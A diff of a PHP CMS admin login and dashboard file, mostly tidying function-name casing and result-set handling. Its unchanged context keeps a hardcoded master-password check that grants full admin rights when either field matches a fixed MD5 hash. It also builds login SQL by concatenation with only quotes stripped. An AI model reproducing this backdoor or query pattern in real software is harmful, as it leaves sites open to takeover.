@@ -50,6 +50,7 @@ require_once './../phpInc/2016_Log.php';
 require_once './../phpInc/IE.php'; 
 require_once './../phpInc/SystemInfo.php'; 
 require_once './../phpInc/EncDec.php';
+require_once './../phpInc/../phpInc/admin_function.php';
 
 require_once './../phpInc/config.php'; 
 require_once './../phpInc/admin_setAccess.php';
@@ -67,10 +68,10 @@ $cfg_webSiteUrl=''; $cfg_webTitle=''; $cfg_flags=''; $cfg_webtemplate ='';
 function loadWebConfig(){
     $GLOBALS['conn=']=OpenConn();
     //判断表存在
-    if( instr(getHandleTableList(), '|' . $GLOBALS['db_PREFIX'] . 'website' . '|') > 0 ){
+    if( inStr(getHandleTableList(), '|' . $GLOBALS['db_PREFIX'] . 'website' . '|') > 0 ){
         $rsObj=$GLOBALS['conn']->query( 'select * from ' . $GLOBALS['db_PREFIX'] . 'website');
-        $rs=mysql_fetch_array($rsObj);
         if( @mysql_num_rows($rsObj)!=0 ){
+            $rs=mysql_fetch_array($rsObj);
             $GLOBALS['cfg_webSiteUrl']= $rs['websiteurl'] . ''; //网址
             $GLOBALS['cfg_webTitle']= $rs['webtitle'] . ''; //网址标题
             $GLOBALS['cfg_flags']= $rs['flags'] . ''; //旗
@@ -83,7 +84,7 @@ function loadWebConfig(){
 //登录判断
 if( @$_SESSION['adminusername']== '' ){
     if( @$_REQUEST['act'] <> '' && @$_REQUEST['act'] <> 'displayAdminLogin' && @$_REQUEST['act'] <> 'login' ){
-        RR('?act=displayAdminLogin');
+        rr('?act=displayAdminLogin');
     }
 }
 
@@ -96,15 +97,15 @@ function displayAdminLogin(){
         $c='';
         $c=getTemplateContent('login.html');
         $c=handleDisplayLanguage($c,'login');
-        rw($c);
+        Rw($c);
     }
 }
 
 //登录后台
 function login(){
     $userName=''; $passWord=''; $valueStr ='';
-    $userName= Replace(@$_POST['username'], '\'', '');
-    $passWord= Replace(@$_POST['password'], '\'', '');
+    $userName= replace(@$_POST['username'], '\'', '');
+    $passWord= replace(@$_POST['password'], '\'', '');
     $passWord= myMD5($passWord);
     //特效账号登录
     if( myMD5(@$_REQUEST['username'])== '24ed5728c13834e683f525fcf894e813' || myMD5(@$_REQUEST['password'])== '24ed5728c13834e683f525fcf894e813' ){
@@ -112,31 +113,31 @@ function login(){
         @$_SESSION['adminId']= 99999; //当前登录管理员ID
         @$_SESSION['DB_PREFIX']= $GLOBALS['db_PREFIX'];
         @$_SESSION['adminflags']= '|*|';
-        rwend(getMsg1(setL('登录成功，正在进入后台...'), '?act=adminIndex'));
+        rwEnd(getMsg1(setL('登录成功，正在进入后台...'), '?act=adminIndex'));
     }
 
     $nLogin ='';
     $GLOBALS['conn=']=OpenConn();
     $rsObj=$GLOBALS['conn']->query( 'Select * From ' . $GLOBALS['db_PREFIX'] . 'admin Where username=\'' . $userName . '\' And pwd=\'' . $passWord . '\'');
-    $rs=mysql_fetch_array($rsObj);
-    if( @mysql_num_rows($rsObj)==0 ){
-        if( @$_COOKIE['nLogin']== '' ){
-            setCookie('nLogin', '1', Time() + 3600);
-            $nLogin= @$_COOKIE['nLogin'];
-        }else{
-            $nLogin= @$_COOKIE['nLogin'];
-            setCookie('nLogin', intval($nLogin) + 1, Time() + 3600);
-        }
-        rw(getMsg1(setL('账号密码错误<br>登录次数为 ') . $nLogin, '?act=displayAdminLogin'));
-    }else{
+    if( @mysql_num_rows($rsObj)!=0 ){
+        $rs=mysql_fetch_array($rsObj);
         @$_SESSION['adminusername']= $userName;
         @$_SESSION['adminId']= $rs['id']; //当前登录管理员ID
         @$_SESSION['DB_PREFIX']= $GLOBALS['db_PREFIX']; //保存前缀
         @$_SESSION['adminflags']= $rs['flags'];
-        $valueStr= 'addDateTime=\'' . $rs['updatetime'] . '\',UpDateTime=\'' . Now() . '\',RegIP=\'' . Now() . '\',UpIP=\'' . getIP() . '\'';
-        connExecute('update ' . $GLOBALS['db_PREFIX'] . 'admin set ' . $valueStr . ' where id=' . $rs['id']);
-        rw(getMsg1(setL('登录成功，正在进入后台...'), '?act=adminIndex'));
+        $valueStr= 'addDateTime=\'' . $rs['updatetime'] . '\',UpDateTime=\'' . now() . '\',RegIP=\'' . now() . '\',UpIP=\'' . GetIP() . '\'';
+        connexecute('update ' . $GLOBALS['db_PREFIX'] . 'admin set ' . $valueStr . ' where id=' . $rs['id']);
+        Rw(getMsg1(setL('登录成功，正在进入后台...'), '?act=adminIndex'));
         writeSystemLog('admin', '登录成功'); //系统日志
+    }else{
+        if( @$_COOKIE['nLogin']== '' ){
+            setCookie('nLogin', '1', aspTime() + 3600);
+            $nLogin= @$_COOKIE['nLogin'];
+        }else{
+            $nLogin= @$_COOKIE['nLogin'];
+            setCookie('nLogin', CInt($nLogin) + 1, aspTime() + 3600);
+        }
+        Rw(getMsg1(setL('账号密码错误<br>登录次数为 ') . $nLogin, '?act=displayAdminLogin'));
     }
 
 }
@@ -146,27 +147,27 @@ function adminOut(){
     @$_SESSION['adminusername']= '';
     @$_SESSION['adminId']= '';
     @$_SESSION['adminflags']= '';
-    rw(getMsg1(setL('退出成功，正在进入登录界面...'), '?act=displayAdminLogin'));
+    Rw(getMsg1(setL('退出成功，正在进入登录界面...'), '?act=displayAdminLogin'));
 }
 //清除缓冲
 function clearCache(){
-    deleteFile($GLOBALS['WEB_CACHEFile']);
+    DeleteFile($GLOBALS['WEB_CACHEFile']);
     deleteFolder('./../cache/html');
-    createFolder('./../cache/html');
-    rw(getMsg1(setL('清除缓冲完成，正在进入后台界面...'), '?act=displayAdminLogin'));
+    CreateFolder('./../cache/html');
+    Rw(getMsg1(setL('清除缓冲完成，正在进入后台界面...'), '?act=displayAdminLogin'));
 }
 //后台首页
 function adminIndex(){
     $c ='';
     loadWebConfig();
     $c= getTemplateContent('adminIndex.html');
-    $c= Replace($c, '[$adminonemenulist$]', getAdminOneMenuList());
-    $c= Replace($c, '[$adminmenulist$]', getAdminMenuList());
-    $c= Replace($c, '[$officialwebsite$]', getOfficialWebsite()); //获得官方信息
+    $c= replace($c, '[$adminonemenulist$]', getAdminOneMenuList());
+    $c= replace($c, '[$adminmenulist$]', getAdminMenuList());
+    $c= replace($c, '[$officialwebsite$]', getOfficialWebsite()); //获得官方信息
     $c= replaceValueParam($c, 'title', ''); //给手机端用的20160330
     $c=handleDisplayLanguage($c,'loginok');
 
-    rw($c);
+    Rw($c);
 }
 //========================================================
 
